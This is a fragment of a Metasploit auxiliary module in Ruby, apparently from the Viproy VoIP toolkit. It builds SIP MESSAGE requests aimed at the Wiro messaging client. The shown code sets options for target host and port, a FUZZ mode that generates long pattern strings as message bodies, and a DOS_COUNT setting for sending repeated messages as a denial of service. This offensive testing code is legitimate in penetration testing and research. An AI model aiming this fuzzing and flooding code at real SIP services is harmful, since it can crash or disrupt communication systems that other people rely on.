...
class Metasploit3 < Msf::Auxiliary
  ...
  def initialize
		super(
			'Name'        => 'Viproy SIP Message Tester for Wiro',
			'Version'     => '1',
			'Description' => 'Message Testing Module for SIP Services for Wiro',
      ...
      OptString.new('PROTO',   [ true, "Protocol for SIP service (UDP|TCP|TLS)", "UDP"]),
			...
			OptString.new('MESSAGE_CONTENT',   [ false, "Message Content", "Viproy"]),
			Opt::RHOST,
			Opt::RPORT(5060),
      ...
      OptInt.new('DOS_COUNT',   [true, 'Message count for DoS', 1]),
    ...
    if datastore['MESSAGE_CONTENT'] =~ /FUZZ/
			msg = Rex::Text.pattern_create(datastore['MESSAGE_CONTENT'].split(" ")[1].to_i)
		else	
			msg = datastore['MESSAGE_CONTENT']
    end

    messagetype = datastore['MESSAGE_TYPE'] || 'text/plain'

    # Message for Wiro
    message =  "From: <sip:anonymous@anonymous.invalid>\r\n"
    message << "To: <sip:anonymous@anonymous.invalid>\r\n"
    message << "NS: imdn <urn:ietf:params:imdn>\r\n"
    message << "imdn.Message-ID: 90DF1F59-D3AA-4880-A4A6-5348590ACAC3\r\n"
    message << "DateTime: 2014-06-18T23:25:15.000Z\r\n"
    message << "imdn.Disposition-Notification: positive-delivery, display\r\n\r\n"
    message << "Content-type: #{messagetype}; charset=utf-8\r\n"
    message << "Content-length: #{msg.length}\r\n\r\n"
    message << msg
